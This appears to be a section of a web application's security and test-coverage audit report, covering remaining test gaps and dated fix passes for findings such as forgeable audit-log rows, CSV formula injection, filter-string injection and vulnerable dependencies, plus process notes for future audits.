`npx vitest run`: 75 test files, 759 passing tests at the time of the audit — **83 files
and 1,087 tests as of 2026-09-15 after the fixes below**. 23 suites failed only because no live
`DATABASE_URL`/seeded Postgres was available in the audit environment (integration suites
that need one, by their own file-header comments) — not code defects. **No coverage tool
is configured** (no `@vitest/coverage-v8`, no `coverage` block in `vitest.config.mts`), so
this assessment is qualitative.

The three areas CLAUDE.md mandates tests for — the assignment engine, identity/dedup, and
SLA logic — are the strongest part of the codebase: thorough negative-path coverage of
every JSONB operator, priority ordering, round-robin + cursor persistence, the
whitelisted-field guard, "never rejects a duplicate," ambiguous-match → merge-review-queue,
merge cascade/self-merge rejection, and business-hours SLA routing. `tests/rls.spec.ts`
(1732 lines) is a real integration suite against live Postgres with RLS enabled,
functionally equivalent to pgTAP.

| Severity | Area / File | Gap | Fix |
|---|---|---|---|
| ~~High~~ RESOLVED 2026-09-15 (`tests/reveal-lead-phone.spec.ts`) | `src/app/(app)/leads/actions.ts` `revealLeadPhone()` | The one function non-negotiable #6 exists for (masked phone + audit row on reveal) has zero direct test — `tests/ai-person-history.spec.ts` only tests masking in the AI-tool path, not this server action. | Add `tests/reveal-lead-phone.spec.ts` asserting: a user without `lead.reveal_phone` gets refused/masked; a user with it gets the full number AND a `lead.reveal_phone` row lands in `audit_log` with the right lead/actor. |
| ~~Medium~~ RESOLVED 2026-09-15 (`.github/workflows/ci.yml`) | CI / test infra | 23 of 75 suites — including assignment/identity/SLA-adjacent webhook and merge suites — silently no-op without a provisioned `DATABASE_URL`+seed; no CI config was available to confirm these actually run anywhere. | Confirm or add a CI job that runs `db:migrate && db:seed` against a throwaway Postgres before `npm test`, so these mandated tests execute on every PR. |
| Low | `src/lib/format/currency.ts` (`formatINR`) | No dedicated unit test for the required money-formatting helper (paise→INR display, rounding, negative/reversal amounts). | Add `tests/format-currency.spec.ts` with cases for 0, large values, and negative (reversal) paise amounts. |
| Low | Coverage tooling | No `@vitest/coverage-v8` configured — no team visibility into numeric coverage drift over time. | Add `@vitest/coverage-v8` and a `coverage` block to `vitest.config.mts`; wire `npm run test:coverage` into CI as a visibility (not gating) metric. |

**Also well covered** (checked, not gaps): money/ledger reversal logic, receipt-number
monotonicity, phone E.164 normalization, and HMAC signature + malformed-payload +
non-2xx-on-failure for all three webhook handlers — all have real negative-path tests, not
just happy path.

---

## Resolved findings

### Third fix pass — 2026-09-15

| # | Was | Fix | Verified by |
|---|---|---|---|
| 6 | Low — four Server Actions validated by hand | `lib/fields/parse-field-value.ts`: one zod-backed parse per field type, used by `updateLead`; zod schema on `createLeadManually`. `Number("next year")` no longer becomes `NaN` in a column | `tests/parse-field-value.spec.ts` (16 cases) |
| 10 | Low — public profile form coerced by hand | Same parser. A student who mistypes a number is told, instead of seeing "thank you" while the answer is dropped to null | Same suite |
| coverage #2 | Medium — the 23 database-backed suites only ran when somebody remembered | `.github/workflows/ci.yml`: Postgres service, the Supabase shim, migrations, seed, typecheck, lint, **the whole suite**, build — on every push and pull request | The exact sequence rehearsed locally from an empty database: 69 migrations, 64 tables, 1,127 tests passing |

### Second fix pass — 2026-09-15 (later the same day)

| # | Was | Fix | Verified by |
|---|---|---|---|
| coverage #1 | **High** — `revealLeadPhone()` untested, the one function non-negotiable #6 exists for | `tests/reveal-lead-phone.spec.ts` — 6 cases: full numbers with the permission, audit row naming lead and actor, refusal without it (and no query at all, so a refusal is not an existence oracle), signed-out refusal, **no audit row when RLS hid the lead**, and that only the three phone columns are selected | Confirmed the suite **fails** when the `lead.reveal_phone` check is removed from the action |
| 3 | Medium — AI analyst scoping had no backstop | `tests/ai-tool-scoping.spec.ts` reads the registry source and fails if any tool omits a scoping helper; an exemption needs a name and a written reason | All 10 tools pass today; a guard test confirms the parsing itself cannot silently match zero tools |
| 2 | Medium — lead creation had no RLS backstop | `lib/identity/assert-lead-visible.ts`: after `resolveOrCreateLead()`, the row is read back through the caller's own RLS-bound client. Invisible means the app-level scope check failed — alert, `lead.scope_violation` audit row, and a plain error to the user. Wired into `createLeadManually` and per row in `importLeads` | `tests/lead-scope-seatbelt.spec.ts`, 6 cases including a failed read counting as a failed check |

**Why the seatbelt does not delete the offending lead.** It fires on a bug, and on a
bug the safest thing to do with a real enquiry from a real person is keep it. The lead
stays visible to whoever legitimately owns that centre, the actor is told plainly that
it failed, and an administrator gets an alert naming the row. Losing a genuine enquiry
to a false positive would be the worse outcome.

### Fix pass — 2026-09-15

Every finding below was re-verified against the code first (several of the audit's
line references had moved), then fixed, then covered by a test where a test was
meaningful. `npx tsc --noEmit`, `npm run lint`, `npm test` (83 files, 1,087 tests) and
`npm run build` all clean afterwards.

| # | Was | Fix | Verified by |
|---|---|---|---|
| 11 | **High** — `audit_log` rows forgeable by any authenticated user | Migration `0068_audit_log_actor_trigger.sql`: a `BEFORE INSERT` trigger rejects any row whose `actor_id` is not `auth.uid()`, while still allowing the null-actor writes webhooks and cron depend on | 3 new cases in `tests/rls.spec.ts`; confirmed all three **fail** with the trigger dropped |
| 1 | **High** (low reachability here) — 4 PostCSS CVEs in the copy bundled inside Next.js | `"overrides": { "postcss": "^8.5.26" }` in `package.json` | `npm audit` went from 6 vulnerabilities to **0**; the nested `next/node_modules/postcss` is gone entirely; `npm run build` passes |
| 5 | Medium — CSV export allowed spreadsheet formula injection | New `src/lib/format/csv.ts` prefixes `= + - @ \t \r` with `'` before quoting | `tests/csv-escape.spec.ts`, incl. the exact `=HYPERLINK(...)` payload the finding described |
| 12 | Medium — search string interpolated into a PostgREST `.or()` filter | New `src/lib/db/filter-term.ts`, applied in the leads list, the students list, **and** the referral picker (which had its own partial inline strip) | `tests/filter-term.spec.ts` |
| 7 | Medium — audit-log write failures were invisible | `writeAuditLog()` still never throws, but now reports to `captureError()`, so a gap reaches Settings → Platform Health and the alert email | Reviewed; no test (the path is a database failure) |
| 8 | Low — task create/complete not audited | `task.create` / `task.complete` rows added | Reviewed |
| 9 | Low — cron secret compared with `!==` | New `src/lib/cron/require-secret.ts` using `timingSafeEqual`, replacing the copy-paste in all 10 routes (also closes the code-quality duplication finding) | `tests/cron-secret.spec.ts`, incl. the missing-`CRON_SECRET` case |
| 4 | Low — CLAUDE.md named a non-existent `auth_has()` | CLAUDE.md now names `auth_scope()` / `can_access_center()`, with a note that `auth_has` never existed | Reviewed |
| dep | Medium — `esbuild` <=0.24.2 via `drizzle-kit` | `"overrides": { "esbuild": "^0.25.0" }` → resolves 0.25.12 | `drizzle-kit migrate` and `npm run db:seed` both still work |
| dep | Medium — `react-hook-form` + `@hookform/resolvers` unused | Removed; CLAUDE.md's stack table corrected | Zero imports confirmed before removal |
| dep | Low — `tw-animate-css` in `dependencies` | Moved to `devDependencies` | Build passes |
| dep | Low — no `engines` / `.nvmrc` | `"engines": { "node": ">=20" }` and `.nvmrc` added | — |
| repo | Info — agent artifacts untracked and unignored | `.agents/`, `.claude-flow/`, `.swarm/`, `ruvector.db`, `skills-lock.json` added to `.gitignore` | `git status` clean of them |
| arch | Low — CLAUDE.md claimed the AI stack was `@anthropic-ai/sdk` | Stack table now names Gemini and points at the DECISIONS.md entry | — |
| arch | Low — CLAUDE.md listed `website/` and `knorish/` webhooks that don't exist | Both marked NOT BUILT YET in the directory layout | — |

**One thing the fix pass added that the audit did not ask for:** finding #1 warned that
the PostCSS assessment should be re-checked if a "custom branding / theme admin setting"
ever fed external input into the CSS pipeline. That setting shipped between the audit and
this fix pass. Re-checked: `primary_color` is validated by regex as `#RRGGBB`
(`settings/organization/actions.ts`) and applied as a React inline style prop, never as
CSS text through PostCSS. The low-reachability assessment still holds.

---

## Process notes

- Re-run `trivy fs .` (or equivalent) after every dependency bump and before each release,
  and log new findings here — don't let them live only in a CI console.
- For every finding: verify the CVE against a public advisory (GitHub Advisory Database,
  NVD, vendor security page) before treating it as actionable — a scanner hit is a lead,
  not a confirmed fact.
- Record not just the fix but the **actual reachable attack surface** in this codebase.
  A CVE with a high CVSS score in the general case can be low urgency here if the
  vulnerable code path is never fed untrusted input — but note explicitly what would
  change that (a new feature, a new integration) so it gets re-flagged later.
- Beyond dependency scans, periodically run a full source audit (not just a diff review)
  against the CLAUDE.md non-negotiables — auth/RLS, webhooks/cron, the financial ledger,
  and input validation are the highest-value areas to re-check, since they're where a
  code change is most likely to silently reintroduce a v1-era failure mode. The
  2026-09-15 audit above is the template: cite file:line for every finding, state
  explicitly when an area was checked and found clean (don't just omit it), and write
  enough context into each finding that it can be fixed without re-deriving the analysis.
- The 2026-09-15 pass was extended same-day into a full project audit (architecture, code
  quality, dependencies, test coverage), run as five parallel focused reviews — see the
  corresponding sections above. Re-run the full five-dimension pass periodically (not just
  the security/dependency slice), since architecture drift and test-coverage gaps age just
  as badly as unpatched CVEs.
